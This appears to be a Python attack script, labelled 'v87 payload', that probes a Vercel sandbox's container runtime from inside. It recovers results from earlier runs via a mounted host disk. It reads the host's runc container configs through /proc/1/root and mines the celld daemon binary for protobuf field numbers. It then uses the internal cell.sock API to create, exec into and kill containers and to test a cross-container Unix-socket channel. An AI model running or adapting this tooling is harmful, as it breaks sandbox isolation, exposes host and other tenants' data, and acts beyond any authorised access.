# -*- coding: utf-8 -*-
"""v87 payload: 恢复 v86 完整结果 (宿主盘日志双通道) + fallback 精简重跑
v86 被截断部分: RUNC config.json / TAG 字段号 / ENUM 枚举数字 / STREAM f3=enum / UNIX 回连
恢复渠道: (1) /mnt/h/volumes/run/vercel/share/v86c2.out (v86 payload 日志)
          (2) /mnt/h/root/v86m.out (v86 guest 日志, 含 COW 轮询全量)
若宿主盘无日志 → fallback 重跑关键部分"""
import socket, time, os, json, re, struct

OUT = '/vercel/sandbox/v87c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v87c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def recover(label, path, wants, lim=220):
    try:
        d = open(path, 'rb').read()
        txt = d.decode('utf-8', errors='replace')
        log('RECOVER %s size=%d' % (label, len(txt)))
        n = 0
        seen = set()
        for ln in txt.splitlines():
            if not any(w in ln for w in wants):
                continue
            if ln in seen:
                continue
            seen.add(ln)
            log('K %s: %s' % (label, ln[:420]))
            n += 1
            if n >= lim:
                log('K %s: TRUNC @%d' % (label, n))
                return True
        log('K %s: %d lines' % (label, n))
        return n > 0
    except Exception as e:
        log('RECOVER %s ERR %s' % (label, type(e).__name__))
        return False


def mini_rerun():
    """fallback: 精简重跑 v86 关键部分"""
    log('--- FALLBACK MINI RERUN ---')
    R = '/proc/1/root'
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    # A. runc 状态
    try:
        base = R + '/run/cell/runc'
        for d in sorted(os.listdir(base)):
            p = base + '/' + d
            try:
                pid = open(p + '/container.pid').read().strip()
                log('RUNC %s pid=%s' % (d, pid))
            except Exception as e:
                log('RUNC %s pid ERR %s' % (d, e))
            try:
                cfg = open(p + '/config.json').read()
                log('RUNC %s config[%d]: %s' % (d, len(cfg), cfg[:1800]))
            except Exception as e:
                log('RUNC %s config ERR %s' % (d, e))
            try:
                for n in sorted(os.listdir(p + '/rootfs'))[:20]:
                    log('RUNC %s rootfs/%s' % (d, n))
            except Exception as e:
                log('RUNC %s rootfs ERR %s' % (d, e))
    except Exception as e:
        log('RUNC ERR %s' % e)
    # B. tag
    try:
        data = open(R + '/opt/vercel/celld', 'rb').read()
        log('celld size=%d' % len(data))
        for fn in ('container_id', 'process_id', 'stream', 'output_stream', 'data', 'sandbox_id'):
            pat = re.compile(rb'protobuf:"[^"]*name=' + re.escape(fn.encode()) + rb'[^"]*"')
            ms = pat.findall(data)
            out = []
            for m in ms[:10]:
                s = m.decode(errors='replace')
                if s not in out:
                    out.append(s[:140])
            log('TAG %-14s x%d -> %s' % (fn, len(ms), out))
    except Exception as e:
        log('TAG ERR %s' % e)
    # C. 枚举数字
    try:
        data = open(R + '/opt/vercel/celld', 'rb').read()
        for ev in ('OUTPUT_STREAM_UNSPECIFIED', 'OUTPUT_STREAM_STDOUT', 'OUTPUT_STREAM_STDERR'):
            for m in re.finditer(re.escape(ev.encode()), data):
                i = m.start()
                seg = data[max(0, i - 120):i + 300]
                strs = re.findall(rb'[\x20-\x7e]{4,}', seg)
                log('ENUM %s -> %s' % (ev, ' | '.join(
                    s.decode(errors='replace')[:50] for s in strs[:8])))
                break
    except Exception as e:
        log('ENUM ERR %s' % e)
    # F. Exec unix 回连 + StreamOutput f3=enum
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v87x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v87x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V87_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v87x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA PA=%s' % (PA or bd[:100]))
        time.sleep(2)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v87x.sock')
            log('UNIX-OK got=%r' % s.recv(100))
            s.close()
        except Exception as e:
            log('UNIX-ERR %s' % type(e).__name__)
        log('host-sock-exists=%s' % os.path.exists('/run/v87x.sock'))
        for f3, label in ((1, 'enum1'), (2, 'enum2'), (3, 'enum3')):
            pl = pstr(1, cid) + pstr(2, PA) + pvarint((3 << 3) | 0) + pvarint(f3)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput',
                                 b'\x00' + struct.pack('>I', len(pl)) + pl,
                                 'application/grpc', t=5)
            log('STREAM f3=%s -> %s %r' % (label, st, bd[:120]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')


def main():
    log('V87 payload start pid=%d' % os.getpid())
    wants = ('RUNC ', 'TAG ', 'ENUM ', 'STREAM', 'UNIX', 'ID=', 'execA', 'killed')
    ok1 = recover('V86C2', '/mnt/h/volumes/run/vercel/share/v86c2.out', wants)
    ok2 = recover('V86M', '/mnt/h/root/v86m.out', wants)
    if not (ok1 or ok2):
        log('RECOVER FAILED both channels')
        mini_rerun()
    log('V87C_DONE')


main()
